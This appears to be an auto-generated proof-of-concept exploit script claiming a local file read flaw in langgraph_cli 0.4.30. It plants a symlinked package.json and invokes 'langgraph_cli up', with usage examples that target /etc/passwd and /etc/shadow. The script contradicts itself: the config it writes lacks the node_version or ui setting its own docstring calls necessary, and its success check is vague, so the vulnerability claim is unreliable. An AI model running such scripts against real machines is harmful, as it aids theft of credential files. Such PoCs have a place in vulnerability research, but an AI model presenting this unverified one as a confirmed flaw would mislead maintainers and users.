#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: lfi-013
# Sink: get_pkg_manager_name
# Auto-generated — run with: python3 lfi_get_node_pm_install_get_pkg_manager_name_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30
Vulnerability: Path traversal in _get_node_pm_install_cmd allows reading arbitrary files
via the --config CLI argument by pointing to a directory containing a symlink to a sensitive file.

The exploit works by:
1. Creating a temporary directory with a symlink named 'package.json' pointing to a target file
2. Using that directory as the config path (--config) to trigger the vulnerable code path
3. The open() call follows the symlink and reads the target file content

Safe by default: reads /etc/hostname as a benign target
"""

import os
import sys
import json
import tempfile
import subprocess
import pathlib
import shutil
import argparse

def create_malicious_config(target_file: str) -> str:
    """
    Create a temporary directory structure that exploits the LFI vulnerability.
    
    The vulnerability occurs in _get_node_pm_install_cmd which opens
    project_dir / 'package.json' where project_dir = config_path.parent.
    
    We create:
    - A directory that will serve as config_path.parent
    - Inside it, a symlink named 'package.json' pointing to the target file
    - A valid config file (langgraph.json) to pass the existence check
    
    Returns the path to the config file (langgraph.json)
    """
    # Create temp directory
    temp_dir = tempfile.mkdtemp(prefix="langgraph_poc_")
    
    # Create the symlink: package.json -> target_file
    package_json_path = os.path.join(temp_dir, "package.json")
    os.symlink(target_file, package_json_path)
    
    # Create a valid config file (langgraph.json) that will pass the existence check
    # The config file needs to be a valid JSON with required fields
    config_content = {
        "dependencies": ["."],
        "graphs": {},
        "env": {}
    }
    
    config_path = os.path.join(temp_dir, "langgraph.json")
    with open(config_path, 'w') as f:
        json.dump(config_content, f)
    
    print(f"[*] Created malicious directory: {temp_dir}")
    print(f"[*] Symlink: {package_json_path} -> {target_file}")
    print(f"[*] Config file: {config_path}")
    
    return config_path

def run_exploit(config_path: str, target_file: str) -> None:
    """
    Execute the exploit by running langgraph_cli with the malicious config.
    
    The vulnerable code path is triggered when:
    1. The config has node_version or ui set (triggers JS dependency installation)
    2. The _get_node_pm_install_cmd function is called with project_dir = config_path.parent
    3. It opens project_dir / 'package.json' which is our symlink
    
    We use the 'up' command which triggers the full chain.
    """
    # Build the command
    cmd = [
        sys.executable, "-m", "langgraph_cli",
        "up",
        "--config", config_path,
        # These flags trigger the node/JS code path
        "--api-version", "0.0.1",
        # Use a non-existent image to fail fast but still trigger the vulnerability
        "--image", "nonexistent:latest"
    ]
    
    print(f"[*] Running command: {' '.join(cmd)}")
    print(f"[*] This will attempt to read: {target_file}")
    print("[*] The vulnerability will trigger before the command fails due to missing image")
    
    try:
        # Run the command, capturing output
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30  # Timeout after 30 seconds
        )
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] STDOUT: {result.stdout[:500] if result.stdout else '(empty)'}")
        print(f"[*] STDERR: {result.stderr[:500] if result.stderr else '(empty)'}")
        
        # Check if we can see the target file content in the output
        # The error might contain the file content if it fails to parse as package.json
        if result.stderr:
            # Look for signs that the file was read
            if "package.json" in result.stderr or "JSON" in result.stderr:
                print("[!] Potential file read detected in error output")
                print(result.stderr)
                
    except subprocess.TimeoutExpired:
        print("[!] Command timed out (expected - the exploit triggers before timeout)")
    except FileNotFoundError:
        print("[!] langgraph_cli not found. Make sure it's installed.")
        print("    Install with: pip install langgraph-cli==0.4.30")
    except Exception as e:
        print(f"[!] Error running exploit: {e}")

def verify_vulnerability(target_file: str) -> bool:
    """
    Verify that the target file exists and is readable.
    """
    path = pathlib.Path(target_file)
    if not path.exists():
        print(f"[!] Target file does not exist: {target_file}")
        return False
    if not path.is_file():
        print(f"[!] Target is not a file: {target_file}")
        return False
    print(f"[*] Target file exists and is readable: {target_file}")
    return True

def cleanup(temp_dir: str) -> None:
    """
    Clean up temporary files.
    """
    if temp_dir and os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[*] Cleaned up: {temp_dir}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                          # Read /etc/hostname (safe default)
  %(prog)s -t /etc/passwd           # Read /etc/passwd
  %(prog)s -t /etc/shadow           # Read /etc/shadow (requires root)
        """
    )
    parser.add_argument(
        "-t", "--target",
        default="/etc/hostname",
        help="Target file to read (default: /etc/hostname)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after execution"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LangGraph CLI LFI Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target file: {args.target}")
    
    # Verify target exists
    if not verify_vulnerability(args.target):
        sys.exit(1)
    
    # Create malicious config
    config_path = create_malicious_config(args.target)
    
    try:
        # Run the exploit
        run_exploit(config_path, args.target)
    finally:
        # Cleanup
        if not args.no_cleanup:
            cleanup(os.path.dirname(config_path))
        else:
            print(f"[*] Temporary files left at: {os.path.dirname(config_path)}")

if __name__ == "__main__":
    main()
